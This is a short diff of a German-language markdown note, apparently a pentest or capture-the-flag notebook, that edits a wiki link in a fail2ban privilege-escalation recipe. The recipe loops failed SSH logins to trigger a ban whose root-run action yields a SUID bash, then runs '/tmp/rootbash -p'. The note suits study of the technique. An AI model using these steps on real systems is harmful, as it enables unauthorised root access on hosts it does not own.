@@ -42,4 +42,4 @@ Ban provozieren (mehrere fehlgeschlagene SSH-Logins):
 ```bash
 for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@<ziel>; done
 ```
-=> Ban feuert `actionban` als root → [[SUID Abuse|SUID-bash]] → `/tmp/rootbash -p`.
+=> Ban feuert `actionban` als root → SUID-bash → `/tmp/rootbash -p`.
